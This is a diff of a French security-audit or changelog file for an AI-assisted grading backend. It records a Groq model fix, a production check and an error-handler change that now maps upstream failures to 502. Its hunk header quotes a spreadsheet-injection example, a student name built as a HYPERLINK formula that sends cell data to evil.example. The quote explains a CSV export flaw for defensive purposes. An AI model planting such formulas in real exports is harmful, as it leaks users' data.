@@ -154,6 +154,10 @@ Un étudiant nommé par exemple `=HYPERLINK("http://evil.example/steal?x="&A2,"c
 
 **Correctif :** modèle par défaut changé en `openai/gpt-oss-120b` dans [ai.service.js](backend/src/services/ai.service.js) (+ test, `.env.example`, README). Vérifié en local : `gradeAnswerWithAI` et `generateEvaluation` fonctionnent avec `openai/gpt-oss-120b` et `openai/gpt-oss-20b`. Sur Render, `GROQ_MODEL` doit aussi être défini (ou retiré) pour ne pas écraser ce défaut.
 
+**Constaté en ligne :** juste après le push, la génération renvoyait encore `Request failed with status code 404` (déploiement Render pas terminé, ~2 min) ; une fois déployé, `POST /api/ai/generate-evaluation` en production renvoie une évaluation valide → l'IA fonctionne à nouveau, sans que `GROQ_MODEL` ne semble avoir besoin d'être modifié sur Render.
+
+**Bug secondaire corrigé :** le gestionnaire d'erreurs global renvoyait `error.status` tel quel, or une erreur axios porte le statut *de l'amont* : un `model_not_found` de Groq (404) sortait donc comme un 404 « route introuvable » avec le message brut `Request failed with status code 404`, et une clé invalide (401) comme une fausse expiration de session. Extrait dans [error.middleware.js](backend/src/middleware/error.middleware.js) : les erreurs axios donnent désormais un 502 avec un message clair (« Le service d’IA est momentanément indisponible »), le détail amont restant dans les logs Render. 3 tests ajoutés ([error.middleware.test.js](backend/src/middleware/__tests__/error.middleware.test.js)), suite : `133 passed`.
+
 **Point de vigilance :** ces modèles « raisonnent » et les tokens de raisonnement consomment le budget de sortie ; la correction IA plafonne à `maxTokens: 500` — à surveiller sur des réponses longues (réponse vide possible).
 
 **Vérifié en production (Render) après déploiement des constats 3 à 8 :** `/api/ai/test` → 404, `X-Powered-By` supprimé, en-têtes `helmet` présents, préflight CORS depuis GitHub Pages toujours accepté, connexion (401 sur faux compte) OK avec les en-têtes CORS. **Non vérifié en ligne :** l'aperçu de fichiers déposés et l'export CSV (nécessitent un compte enseignant et des données réelles).
